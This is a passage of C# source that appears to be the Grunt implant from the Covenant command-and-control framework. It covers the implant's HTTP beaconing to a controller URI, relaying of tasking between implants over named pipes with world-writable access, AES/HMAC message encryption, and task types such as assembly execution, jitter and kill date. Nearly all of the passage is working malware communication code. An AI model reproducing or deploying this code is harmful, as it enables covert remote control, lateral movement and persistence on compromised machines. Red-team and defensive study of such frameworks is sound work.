{\n        private object _UpstreamLock = new object();\n        private IMessenger UpstreamMessenger { get; set; }\n        private object _MessageQueueLock = new object();\n        private Queue<string> MessageQueue { get; } = new Queue<string>();\n\n        private MessageCrafter Crafter { get; }\n        private Profile Profile { get; }\n\n        protected List<IMessenger> DownstreamMessengers { get; } = new List<IMessenger>();\n\n        public TaskingMessenger(MessageCrafter Crafter, IMessenger Messenger, Profile Profile)\n        {\n            this.Crafter = Crafter;\n            this.UpstreamMessenger = Messenger;\n            this.Profile = Profile;\n            this.UpstreamMessenger.UpstreamEventHandler += (sender, e) => {\n                this.QueueTaskingMessage(e.Message);\n                this.WriteTaskingMessage();\n            };\n        }\n\n        public GruntTaskingMessage ReadTaskingMessage()\n        {\n            ProfileMessage readMessage = null;\n            lock (_UpstreamLock)\n            {\n                readMessage = this.UpstreamMessenger.Read();\n            }\n            if (readMessage == null)\n            {\n                return null;\n            }\n            GruntEncryptedMessage gruntMessage = null;\n            if (readMessage.Type == MessageType.Read) \n            {\n                gruntMessage = this.Profile.ParseGetResponse(readMessage.Message);\n            }\n            else if (readMessage.Type == MessageType.Write)\n            {\n                gruntMessage = this.Profile.ParsePostResponse(readMessage.Message);\n            }\n            if (gruntMessage == null)\n            {\n                return null;\n            }\n            else if (gruntMessage.Type == GruntEncryptedMessage.GruntEncryptedMessageType.Tasking)\n            {\n                string json = this.Crafter.Retrieve(gruntMessage);\n                return (json == null || json == \"\") ? null : GruntTaskingMessage.FromJson(json);\n            }\n            else\n            {\n                string json = this.Crafter.Retrieve(gruntMessage);\n                GruntEncryptedMessage wrappedMessage = GruntEncryptedMessage.FromJson(json);\n                IMessenger relay = this.DownstreamMessengers.FirstOrDefault(DM => DM.Identifier == wrappedMessage.GUID);\n                if (relay != null)\n                {\n                    relay.Write(this.Profile.FormatGetResponse(wrappedMessage));\n                }\n                return null;\n            }\n        }\n\n        public void QueueTaskingMessage(string Message, string Meta = \"\")\n        {\n            GruntEncryptedMessage gruntMessage = this.Crafter.Create(Message, Meta);\n            string uploaded = this.Profile.FormatPostRequest(gruntMessage);\n            lock (_MessageQueueLock)\n            {\n                this.MessageQueue.Enqueue(uploaded);\n            }\n        }\n\n        public void WriteTaskingMessage()\n        {\n            try\n            {\n                lock (_UpstreamLock)\n                {\n                    lock (_MessageQueueLock)\n                    {\n                        this.UpstreamMessenger.Write(this.MessageQueue.Dequeue());\n                    }\n                }\n            }\n            catch (InvalidOperationException) {}\n        }\n\n        public void SetAuthenticator(string Authenticator)\n        {\n            lock (this._UpstreamLock)\n            {\n                this.UpstreamMessenger.Authenticator = Authenticator;\n            }\n        }\n\n        public bool Connect(string Hostname, string PipeName)\n        {\n            IMessenger olddownstream = this.DownstreamMessengers.FirstOrDefault(DM => DM.Hostname.ToLower() == (Hostname + \":\" + PipeName).ToLower());\n            if (olddownstream != null)\n            {\n                olddownstream.Close();\n                this.DownstreamMessengers.Remove(olddownstream);\n            }\n\n            SMBMessenger downstream = new SMBMessenger(Hostname, PipeName);\n            Thread readThread = new Thread(() =>\n            {\n                while (downstream.IsConnected)\n                {\n                    try\n                    {\n                        ProfileMessage read = downstream.Read();\n                        if (read != null && !string.IsNullOrEmpty(read.Message))\n                        {\n                            if (string.IsNullOrEmpty(downstream.Identifier))\n                            {\n                                GruntEncryptedMessage message = this.Profile.ParsePostRequest(read.Message);\n                                if (message.GUID.Length == 20)\n                                {\n                                    downstream.Identifier = message.GUID.Substring(10);\n                                }\n                                else if (message.GUID.Length == 10)\n                                {\n                                    downstream.Identifier = message.GUID;\n                                }\n                            }\n                            this.UpstreamMessenger.Write(read.Message);\n                        }\n                    }\n                    catch (Exception e)\n                    {\n                        Console.Error.WriteLine(\"Thread Exception: \" + e.Message + Environment.NewLine + e.StackTrace);\n                    }\n                }\n                // Connection became disconnected and therefore we remove the downstream object\n                this.DownstreamMessengers.Remove(downstream);\n            });\n            downstream.ReadThread = readThread;\n            downstream.ReadThread.Start();\n            this.DownstreamMessengers.Add(downstream);\n            return true;\n        }\n\n        public bool Disconnect(string Identifier)\n        {\n            IMessenger downstream = this.DownstreamMessengers.FirstOrDefault(DM => DM.Identifier.ToLower() == Identifier.ToLower());\n            if (downstream != null)\n            {\n                downstream.Close();\n                this.DownstreamMessengers.Remove(downstream);\n                return true;\n            }\n            return false;\n        }\n    }\n\n    public class SMBMessenger : IMessenger\n    {\n        public string Hostname { get; } = string.Empty;\n        public string Identifier { get; set; } = string.Empty;\n        public string Authenticator { get; set; } = string.Empty;\n        public EventHandler<MessageEventArgs> UpstreamEventHandler { get; set; }\n        public Thread ReadThread { get; set; } = null;\n\n        private string PipeName { get; } = null;\n        // Thread that monitors the status of the named pipe and updates _IsConnected accordingly.\n        private Thread MonitoringThread { get; set; } = null;\n        // This flag syncs communication peers in case one of the them dies (see method Read and Write)\n        private bool IsServer { get; set; }\n        private int Timeout { get; set; } = 5000;\n\n        private object _PipeLock = new object();\n        private PipeStream _Pipe;\n        private PipeStream Pipe\n        {\n            get { lock (this._PipeLock) { return this._Pipe; } }\n            set { lock (this._PipeLock) { this._Pipe = value; } }\n        }\n\n        protected object _IsConnectedLock = new object();\n        private bool _IsConnected;\n        public bool IsConnected\n        {\n            get { lock (this._IsConnectedLock) { return this._IsConnected; } }\n            set { lock (this._IsConnectedLock) { this._IsConnected = value; } }\n        }\n\n        public SMBMessenger(string Hostname, string Pipename)\n        {\n            this.Hostname = Hostname;\n            this.PipeName = Pipename;\n            this.IsServer = false;\n            this.InitializePipe();\n        }\n\n        public SMBMessenger(PipeStream Pipe, string Pipename)\n        {\n            this.Pipe = Pipe;\n            this.PipeName = Pipename;\n            this.IsServer = true;\n            if (Pipe != null && Pipe.IsConnected)\n            {\n                this.IsConnected = Pipe.IsConnected;\n                this.MonitorPipeState();\n            }\n            this.InitializePipe();\n        }\n\n        public ProfileMessage Read()\n        {\n            ProfileMessage result = null;\n            try\n            {\n                // If the Grunt acts as SMB server, then after an interruption it shall wait in the read method until the connection \n                // is re-established.\n                // This ensures that after the interruption, both communication peers return to their pre-defined state. If this is not\n                // implemented, then both communication peers might return to the same state (e.g., read), which leads to a deadlock.\n                if (this.IsServer)\n                {\n                    this.InitializePipe();\n                }\n                if (this.IsConnected)\n                {\n                    result = new ProfileMessage { Type = MessageType.Read, Message = Common.GruntEncoding.GetString(this.ReadBytes()) };\n                }\n            }\n            // These are exceptions that could be raised, if the named pipe became (unexpectedly) closed. It is important to catch these \n            // exceptions here so that the calling method can continue until it calls Read or Write the next time and then, the they'll \n            // try to restablish the named pipe\n            catch (IOException) { }\n            catch (NullReferenceException) { }\n            catch (ObjectDisposedException) { }\n            return result;\n        }\n\n        public void Write(string Message)\n        {\n            try\n            {\n                // If the Grunt acts as SMB client, then after an interruption it shall wait in the write method until the connection \n                // is re-established.\n                // This ensures that after the interruption, both communication peers return to their pre-defined state. If this is not\n                // implemented, then both communication peers might return to the same state (e.g., read), which leads to a deadlock.\n                if (!this.IsServer)\n                {\n                    this.InitializePipe();\n                }\n                if (this.IsConnected)\n                {\n                    this.WriteBytes(Common.GruntEncoding.GetBytes(Message));\n                }\n            }\n            // These are exceptions that could be raised, if the named pipe became (unexpectedly) closed. It is important to catch these \n            // exceptions here so that the calling method can continue until it calls Read or Write the next time and then, the they'll \n            // try to restablish the named pipe\n            catch (IOException) { }\n            catch (NullReferenceException) { }\n            catch (ObjectDisposedException) { }\n        }\n\n        public void Close()\n        {\n            // Close named pipe and terminate MonitoringThread by setting IsConnected to false\n            lock (this._PipeLock)\n            {\n                try\n                {\n                    if (this._Pipe != null)\n                    {\n                        this._Pipe.Close();\n                    }\n                }\n                catch (Exception) { }\n                this._Pipe = null;\n                this.IsConnected = false;\n            }\n        }\n\n        private void InitializePipe()\n        {\n            if (!this.IsConnected)\n            {\n                // If named pipe became disconnected (!this.IsConnected), then wait for a new incoming connection, else continue.\n                if (this.IsServer)\n                {\n                    PipeSecurity ps = new PipeSecurity();\n                    ps.AddAccessRule(new PipeAccessRule(new SecurityIdentifier(WellKnownSidType.WorldSid, null), PipeAccessRights.FullControl, AccessControlType.Allow));\n                    NamedPipeServerStream newServerPipe = new NamedPipeServerStream(this.PipeName, PipeDirection.InOut, NamedPipeServerStream.MaxAllowedServerInstances, PipeTransmissionMode.Byte, PipeOptions.Asynchronous, 1024, 1024, ps);\n                    newServerPipe.WaitForConnection();\n                    this.Pipe = newServerPipe;\n                    this.IsConnected = true;\n                    this.MonitorPipeState();\n                    // Tell the parent Grunt the GUID so that it knows to which child grunt which messages shall be forwarded. Without this message, any further communication breaks.\n                    this.UpstreamEventHandler?.Invoke(this, new MessageEventArgs { Message = string.Empty });\n                }\n                // If named pipe became disconnected (!this.IsConnected), then try to re-connect to the SMB server, else continue.\n                else\n                {\n                    NamedPipeClientStream ClientPipe = new NamedPipeClientStream(Hostname, PipeName, PipeDirection.InOut, PipeOptions.Asynchronous);\n                    ClientPipe.Connect(Timeout);\n                    ClientPipe.ReadMode = PipeTransmissionMode.Byte;\n                    this.Pipe = ClientPipe;\n                    this.IsConnected = true;\n                    // Start the pipe status monitoring thread\n                    this.MonitorPipeState();\n                }\n            }\n        }\n\n        private void MonitorPipeState()\n        {\n            this.MonitoringThread = new Thread(() =>\n            {\n                while (this.IsConnected)\n                {\n                    try\n                    {\n\n                        Thread.Sleep(1000);\n                        // We cannot use this.Pipe.IsConnected because this will result in a deadlock\n                        this.IsConnected = this._Pipe.IsConnected;\n                        if (!this.IsConnected)\n                        {\n                            this._Pipe.Close();\n                            this._Pipe = null;\n                        }\n                    }\n                    catch (Exception) { }\n                }\n            });\n            this.MonitoringThread.IsBackground = true;\n            this.MonitoringThread.Start();\n        }\n\n        private void WriteBytes(byte[] bytes)\n        {\n            byte[] compressed = Utilities.Compress(bytes);\n            byte[] size = new byte[4];\n            size[0] = (byte)(compressed.Length >> 24);\n            size[1] = (byte)(compressed.Length >> 16);\n            size[2] = (byte)(compressed.Length >> 8);\n            size[3] = (byte)compressed.Length;\n            this.Pipe.Write(size, 0, size.Length);\n            var writtenBytes = 0;\n            while (writtenBytes < compressed.Length)\n            {\n                int bytesToWrite = Math.Min(compressed.Length - writtenBytes, 1024);\n                this.Pipe.Write(compressed, writtenBytes, bytesToWrite);\n                writtenBytes += bytesToWrite;\n            }\n        }\n\n        private byte[] ReadBytes()\n        {\n            byte[] size = new byte[4];\n            int totalReadBytes = 0;\n            do\n            {\n                totalReadBytes += this.Pipe.Read(size, 0, size.Length);\n            } while (totalReadBytes < size.Length);\n            int len = (size[0] << 24) + (size[1] << 16) + (size[2] << 8) + size[3];\n\n            byte[] buffer = new byte[1024];\n            using (var ms = new MemoryStream())\n            {\n                totalReadBytes = 0;\n                int readBytes = 0;\n                do\n                {\n                    readBytes = this.Pipe.Read(buffer, 0, buffer.Length);\n                    ms.Write(buffer, 0, readBytes);\n                    totalReadBytes += readBytes;\n                } while (totalReadBytes < len);\n                return Utilities.Decompress(ms.ToArray());\n            }\n        }\n    }\n\n    public class HttpMessenger : IMessenger\n    {\n        public string Hostname { get; } = \"\";\n        public string Identifier { get; set; } = \"\";\n        public string Authenticator { get; set; } = \"\";\n        public EventHandler<MessageEventArgs> UpstreamEventHandler { get; set; }\n\n        private string CovenantURI { get; }\n        private CookieWebClient CovenantClient { get; set; } = new CookieWebClient();\n        private object _WebClientLock = new object();\n\n        private Random Random { get; set; } = new Random();\n        private List<string> ProfileHttpHeaderNames { get; }\n        private List<string> ProfileHttpHeaderValues { get; }\n        private List<string> ProfileHttpUrls { get; }\n\n        private bool UseCertPinning { get; set; }\n        private bool ValidateCert { get; set; }\n\n        private Queue<ProfileMessage> ToReadQueue { get; } = new Queue<ProfileMessage>();\n\n        public HttpMessenger(string CovenantURI, string CovenantCertHash, bool UseCertPinning, bool ValidateCert, List<string> ProfileHttpHeaderNames, List<string> ProfileHttpHeaderValues, List<string> ProfileHttpUrls)\n        {\n            this.CovenantURI = CovenantURI;\n            this.Hostname = CovenantURI.Split(':')[1].Split('/')[2];\n            this.ProfileHttpHeaderNames = ProfileHttpHeaderNames;\n            this.ProfileHttpHeaderValues = ProfileHttpHeaderValues;\n            this.ProfileHttpUrls = ProfileHttpUrls;\n\n            this.CovenantClient.UseDefaultCredentials = true;\n            this.CovenantClient.Proxy = WebRequest.DefaultWebProxy;\n            this.CovenantClient.Proxy.Credentials = CredentialCache.DefaultNetworkCredentials;\n\n            this.UseCertPinning = UseCertPinning;\n            this.ValidateCert = ValidateCert;\n\n            ServicePointManager.SecurityProtocol = SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls;\n            ServicePointManager.ServerCertificateValidationCallback = (sender, cert, chain, errors) =>\n            {\n                bool valid = true;\n                if (this.UseCertPinning && CovenantCertHash != \"\")\n                {\n                    valid = cert.GetCertHashString() == CovenantCertHash;\n                }\n                if (valid && this.ValidateCert)\n                {\n                    valid = errors == System.Net.Security.SslPolicyErrors.None;\n                }\n                return valid;\n            };\n        }\n\n        public ProfileMessage Read()\n        {\n            if (this.ToReadQueue.Any())\n            {\n                return this.ToReadQueue.Dequeue();\n            }\n            lock (this._WebClientLock)\n            {\n                this.SetupCookieWebClient();\n                return new ProfileMessage { Type = MessageType.Read, Message = this.CovenantClient.DownloadString(this.CovenantURI + this.GetURL()) };\n            }\n        }\n\n        public void Write(string Message)\n        {\n            lock (this._WebClientLock)\n            {\n                this.SetupCookieWebClient();\n                ProfileMessage ToReadMessage = new ProfileMessage { Type = MessageType.Write, Message = this.CovenantClient.UploadString(this.CovenantURI + this.GetURL(), Message) };\n                if (ToReadMessage.Message != \"\")\n                {\n                    this.ToReadQueue.Enqueue(ToReadMessage);\n                }\n            }\n        }\n\n        public void Close() { }\n\n        private string GetURL()\n        {\n            return this.ProfileHttpUrls[this.Random.Next(this.ProfileHttpUrls.Count)].Replace(\"{GUID}\", this.Identifier);\n        }\n\n        private void SetupCookieWebClient()\n        {\n            for (int i = 0; i < ProfileHttpHeaderValues.Count; i++)\n            {\n                if (ProfileHttpHeaderNames[i] == \"Cookie\")\n                {\n                    this.CovenantClient.SetCookies(new Uri(this.CovenantURI), ProfileHttpHeaderValues[i].Replace(\";\", \",\").Replace(\"{GUID}\", this.Identifier));\n                }\n                else\n                {\n                    this.CovenantClient.Headers.Set(ProfileHttpHeaderNames[i].Replace(\"{GUID}\", this.Identifier), ProfileHttpHeaderValues[i].Replace(\"{GUID}\", this.Identifier));\n                }\n            }\n        }\n    }\n\n    public class MessageCrafter\n    {\n        private string GUID { get; }\n        private Aes SessionKey { get; }\n\n        public MessageCrafter(string GUID, Aes SessionKey)\n        {\n            this.GUID = GUID;\n            this.SessionKey = SessionKey;\n        }\n\n        public GruntEncryptedMessage Create(string Message, string Meta = \"\")\n        {\n            return this.Create(Common.GruntEncoding.GetBytes(Message), Meta);\n        }\n\n        public GruntEncryptedMessage Create(byte[] Message, string Meta = \"\")\n        {\n            byte[] encryptedMessagePacket = Utilities.AesEncrypt(Message, this.SessionKey.Key);\n            byte[] encryptionIV = new byte[Common.AesIVLength];\n            Buffer.BlockCopy(encryptedMessagePacket, 0, encryptionIV, 0, Common.AesIVLength);\n            byte[] encryptedMessage = new byte[encryptedMessagePacket.Length - Common.AesIVLength];\n            Buffer.BlockCopy(encryptedMessagePacket, Common.AesIVLength, encryptedMessage, 0, encryptedMessagePacket.Length - Common.AesIVLength);\n\n            byte[] hmac = Utilities.ComputeHMAC(encryptedMessage, SessionKey.Key);\n            return new GruntEncryptedMessage\n            {\n                GUID = this.GUID,\n                Meta = Meta,\n                EncryptedMessage = Convert.ToBase64String(encryptedMessage),\n                IV = Convert.ToBase64String(encryptionIV),\n                HMAC = Convert.ToBase64String(hmac)\n            };\n        }\n\n        public string Retrieve(GruntEncryptedMessage message)\n        {\n            if (message == null || !message.VerifyHMAC(this.SessionKey.Key))\n            {\n                return null;\n            }\n            return Common.GruntEncoding.GetString(Utilities.AesDecrypt(message, SessionKey.Key));\n        }\n    }\n\n    public class CookieWebClient : WebClient\n    {\n        private CookieContainer CookieContainer { get; }\n        public CookieWebClient()\n        {\n            this.CookieContainer = new CookieContainer();\n        }\n        public void SetCookies(Uri uri, string cookies)\n        {\n            this.CookieContainer.SetCookies(uri, cookies);\n        }\n        protected override WebRequest GetWebRequest(Uri address)\n        {\n            var request = base.GetWebRequest(address) as HttpWebRequest;\n            if (request == null) return base.GetWebRequest(address);\n            request.CookieContainer = CookieContainer;\n            return request;\n        }\n    }\n\n    public enum GruntTaskingType\n    {\n        Assembly,\n        SetDelay,\n        SetJitter,\n        SetConnectAttempts,\n        SetKillDate,\n        Exit,\n        Connect,\n        Disconnect,\n        Tasks,\n        TaskKill\n    }\n\n    public class GruntTaskingMessage\n    {\n        public GruntTaskingType Type { get; set; }\n        public string Name { get; set; }\n        public string Message { get; set; }\n        public bool Token { get; set; }\n\n        private static string GruntTaskingMessageFormat = @\"{{\"\"type\"\":\"\"{0}\"\",\"\"name\"\":\"\"{1}\"\",\"\"message\"\":\"\"{2}\"\",\"\"token\"\":{3}}}\";\n        public static GruntTaskingMessage FromJson(string message)\n        {\n            List<string> parseList = Utilities.Parse(message, GruntTaskingMessageFormat);\n            if (parseList.Count < 3) { return null; }\n            return new GruntTaskingMessage\n            {\n\t\t\t\tType = (GruntTaskingType)Enum.Parse(typeof(GruntTaskingType), parseList[0], true),\n                Name = parseList[1],\n                Message = parseList[2],\n                Token = Convert.ToBoolean(parseList[3])\n            };\n        }\n\n        public static string ToJson(GruntTaskingMessage message)\n        {\n            return String.Format(\n                GruntTaskingMessageFormat,\n                message.Type.ToString(\"D\"),\n                Utilities.JavaScriptStringEncode(message.Name),\n                Utilities.JavaScriptStringEncode(message.Message),\n                message.Token\n            );\n        }\n    }\n\n    public enum GruntTaskingStatus\n    {\n        Uninitialized,\n        Tasked,\n        Progressed,\n        Completed,\n        Aborted\n    }\n\n    public class GruntTaskingMessageResponse\n    {\n        public GruntTaskingMessageResponse(GruntTaskingStatus status, string output)\n        {\n            Status = status;\n            Output = output;\n        }\n        public GruntTaskingStatus Status { get; set; }\n        public string Output { get; set; }\n\n        private static string GruntTaskingMessageResponseFormat = @\"{{\"\"status\"\":\"\"{0}\"\",\"\"output\"\":\"\"{1}\"\"}}\";\n        public string ToJson()\n        {\n            return String.Format(\n                GruntTaskingMessageResponseFormat,\n                this.Status.ToString(\"D\"),\n                Utilities.JavaScriptStringEncode(this.Output)\n            );\n        }\n    }\n\n    public class GruntEncryptedMessage\n    {\n        public enum GruntEncryptedMessageType\n        {\n            Routing,\n            Tasking\n        }\n\n\t\tpublic string GUID { get; set; } = \"\";\n        public GruntEncryptedMessageType Type { get; set; }\n        public string Meta { get; set; } = \"\";\n\t\tpublic string IV { get; set; } = \"\";\n\t\tpublic string EncryptedMessage { get; set; } = \"\";\n\t\tpublic string HMAC { get; set; } = \"\";\n\n        public bool VerifyHMAC(byte[] Key)\n        {\n            if (EncryptedMessage == \"\" || HMAC == \"\" || Key.Length == 0) { return false; }\n            try\n            {\n                var hashedBytes = Convert.FromBase64String(this.EncryptedMessage);\n                return Utilities.VerifyHMAC(hashedBytes, Convert.FromBase64String(this.HMAC), Key);\n            }\n            catch\n            {\n                return false;\n            }\n        }\n\n        private static string GruntEncryptedMessageFormat = @\"{{\"\"GUID\"\":\"\"{0}\"\",\"\"Type\"\":{1},\"\"Meta\"\":\"\"{2}\"\",\"\"IV\"\":\"\"{3}\"\",\"\"EncryptedMessage\"\":\"\"{4}\"\",\"\"HMAC\"\":\"\"{5}\"\"}}\";\n        public static GruntEncryptedMessage FromJson(string message)\n        {\n\t\t\tList<string> parseList = Utilities.Parse(message, GruntEncryptedMessageFormat);\n            if (parseList.Count < 5) { return null; }\n            return new GruntEncryptedMessage\n            {\n                GUID = parseList[0],\n                Type = (GruntEncryptedMessageType)int.Parse(parseList[1]),\n                Meta = parseList[2],\n                IV = parseList[3],\n                EncryptedMessage = parseList[4],\n                HMAC = parseList[5]\n            };\n        }\n\n        public static string ToJson(GruntEncryptedMessage message)\n        {\n            return String.Format(\n                GruntEncryptedMessageFormat,\n                Utilities.JavaScriptStringEncode(message.GUID),\n                message.Type.ToString(\"D\"),\n                Utilities.JavaScriptStringEncode(message.Meta),\n                Utilities.JavaScriptStringEncode(message.IV),\n                Utilities.JavaScriptStringEncode(message.EncryptedMessage),\n                Utilities.JavaScriptStringEncode(message.HMAC)\n            );\n        }\n    }\n\n    public static class Common\n    {\n        public static int AesIVLength = 16;\n        public static CipherMode AesCipherMode = CipherMode.CBC;\n        public static PaddingMode AesPaddingMode = PaddingMode.PKCS7;\n        public static Encoding GruntEncoding = Encoding.UTF8;\n    }\n\n    public static class Utilities\n    {\n        // Returns IV (16 bytes) + EncryptedData byte array\n        public static byte[] AesEncrypt(byte[] data, byte[] key)\n        {\n            Aes SessionKey = Aes.Create();\n            SessionKey.Mode = Common.AesCipherMode;\n            SessionKey.Padding = Common.AesPaddingMode;\n            SessionKey.GenerateIV();\n            SessionKey.Key = key;\n\n            byte[] encrypted = SessionKey.CreateEncryptor().TransformFinalBlock(data, 0, data.Length);\n            byte[] result = new byte[SessionKey.IV.Length + encrypted.Length];\n            Buffer.BlockCopy(SessionKey.IV, 0, result, 0, SessionKey.IV.Length);\n            Buffer.BlockCopy(encrypted, 0, result, SessionKey.IV.Length, encrypted.Length);\n            return result;\n        }\n\n        // Data should be of format: IV (16 bytes) + EncryptedBytes\n        public static byte[] AesDecrypt(byte[] data, byte[] key)\n        {\n            Aes SessionKey = Aes.Create();\n            byte[] iv = new byte[Common.AesIVLength];\n            Buffer.BlockCopy(data, 0, iv, 0, Common.AesIVLength);\n            SessionKey.IV = iv;\n            SessionKey.Key = key;\n            byte[] encryptedData = new byte[data.Length - Common.AesIVLength];\n            Buffer.BlockCopy(data, Common.AesIVLength, encryptedData, 0, data.Length - Common.AesIVLength);\n            byte[] decrypted = SessionKey.CreateDecryptor().TransformFinalBlock(encryptedData, 0, encryptedData.Length);\n\n            return decrypted;\n        }\n\n        // Convenience method for decrypting an EncryptedMessagePacket\n        public static byte[] AesDecrypt(GruntEncryptedMessage encryptedMessage, byte[] key)\n        {\n            byte[] iv = Convert.FromBase64String(encryptedMessage.IV);\n            byte[] encrypted = Convert.FromBase64String(encryptedMessage.EncryptedMessage);\n            byte[] combined = new byte[iv.Length + encrypted.Length];\n            Buffer.BlockCopy(iv, 0, combined, 0, iv.Length);\n            Buffer.BlockCopy(encrypted, 0, combined, iv.Length, encrypted.Length);\n\n            return AesDecrypt(combined, key);\n        }\n\n        public static byte[] ComputeHMAC(byte[] data, byte[] key)\n        {\n            HMACSHA256 SessionHmac = new HMACSHA256(key);\n            return SessionHmac.ComputeHash(data);\n        }\n\n        public static bool VerifyHMAC(byte[] hashedBytes, byte[] hash, byte[] key)\n        {\n            HMACSHA256 hmac = new HMACSHA256(key);\n            byte[] calculatedHash = hmac.ComputeHash(hashedBytes);\n            // Should do double hmac?\n            return Convert.ToBase64String(calculatedHash) == Convert.ToBase64String(hash);\n        }\n\n        public static byte[] Compress(byte[] bytes)\n        {\n            byte[] compressedBytes;\n            using (MemoryStream memoryStream = new MemoryStream())\n            {\n                using (DeflateStream deflateStream = new DeflateStream(memoryStream, CompressionMode.Compress))\n                {\n                    deflateStream.Write(bytes, 0, bytes.Length);\n                }\n                compressedBytes = memoryStream.ToArray();\n            }\n            return compressedBytes;\n        }\n\n        public static byte[] Decompress(byte[] compressed)\n        {\n            using (MemoryStream inputStream = new MemoryStream(compressed.Length))\n            {\n                inputStream.Write(compressed, 0, compressed.Length);\n                inputStream.Seek(0, SeekOrigin.Begin);\n                using (MemoryStream outputStream = new MemoryStream())\n                {\n                    using (DeflateStream deflateStream = new DeflateStream(inputStream, CompressionMode.Decompress))\n                    {\n                        byte[] buffer = new byte[4096];\n                        int bytesRead;\n                        while ((bytesRead = deflateStream.Read(buffer, 0, buffer.Length)) != 0)\n                        {\n                            outputStream.Write(buffer, 0, bytesRead);\n                        }\n                    }\n                    return outputStream.ToArray();\n                }\n            }\n        }\n\n        public static List<string> Parse(string data, string format)\n        {\n            format = Regex.Escape(format).Replace(\"\\\\{\", \"{\").Replace(\"{{\", \"{\").Replace(\"}}\", \"}\");\n\t\t\tif (format.Contains(\"{0}\")) { format = format.Replace(\"{0}\", \"(?'group0'.*)\"); }\n            if (format.Contains(\"{1}\")) { format = format.Replace(\"{1}\", \"(?'group1'.*)\"); }\n            if (format.Contains(\"{2}\")) { format = format.Replace(\"{2}\", \"(?'group2'.*)\"); }\n            if (format.Contains(\"{3}\")) { format = format.Replace(\"{3}\", \"(?'group3'.*)\"); }\n            if (format.Contains(\"{4}\")) { format = format.Replace(\"{4}\", \"(?'group4'.*)\"); }\n            if (format.Contains(\"{5}\")) { format = format.Replace(\"{5}\", \"(?'group5'.*)\"); }\n            Match match = new Regex(format).Match(data);\n            List<string> matches = new List<string>();\n\t\t\tif (match.Groups[\"group0\"] != null) { matches.Add(match.Groups[\"group0\"].Value); }\n            if (match.Groups[\"group1\"] != null) { matches.Add(match.Groups[\"group1\"].Value); }\n            if (match.Groups[\"group2\"] != null) { matches.Add(match.Groups[\"group2\"].Value); }\n            if (match.Groups[\"group3\"] != null) { matches.Add(match.Groups[\"group3\"].Value); }\n            if (match.Groups[\"group4\"] != null) { matches.Add(match.Groups[\"group4\"].Value); }\n            if (match.Groups[\"group5\"] != null) { matches.Add(match.Groups[\"group5\"].Value); }\n            return matches;\n        }\n\n        // Adapted from https://github.com/mono/mono/blob/master/mcs/class/System.Web/System.Web/HttpUtility.cs\n        public static string JavaScriptStringEncode(string value)\n        {\n            if (String.IsNullOrEmpty(value)) { return String.Empty; }\n            int len = value.Length;\n            bool needEncode = false;\n            char c;\n            for (int i = 0; i < len; i++)\n            {\n                c = value[i];\n                if (c >= 0 && c <= 31 || c == 34 || c == 39 || c == 60 || c == 62 || c == 92)\n                {\n                    needEncode = true;\n                    break;\n                }\n            }\n            if (!needEncode) { return value; }\n\n            var sb = new StringBuilder();\n            for (int i = 0; i < len; i++)\n            {\n                c = value[i];\n                if (c >= 0 && c <= 7 || c == 11 || c >= 14 && c <= 31 || c == 39 || c == 60 || c == 62)\n                {\n                    sb.AppendFormat(\"\\\\u{0:x4}\", (int)c);\n                }\n                else\n                {\n                    switch ((int)c)\n                    {\n                        case 8:\n                            sb.Append(\"\\\\b\");\n                            break;\n                        case 9:\n                            sb.Append(\"\\\\t\");\n                            break;\n                        case 10:\n                            sb.Append(\"\\\\n\");\n                            break;\n                        case 12:\n                            sb.Append(\"\\\\f\");\n                            break;\n                        case 13:\n                            sb.Append(\"\\\\r\");\n                            break;\n                        case 34:\n                            sb.Append(\"\\\\\\\"\");\n                            break;\n                        case 92:\n                            sb.Append(\"\\\\\\\\\");\n                            break;\n                        default:\n                            sb.Append(c);\n                            break;\n                    }\n                }\n            }\n            return sb.ToString();\n        }\n\n        // {{REPLACE_PROFILE_MESSAGE_TRANSFORM}}\n    }\n}"
}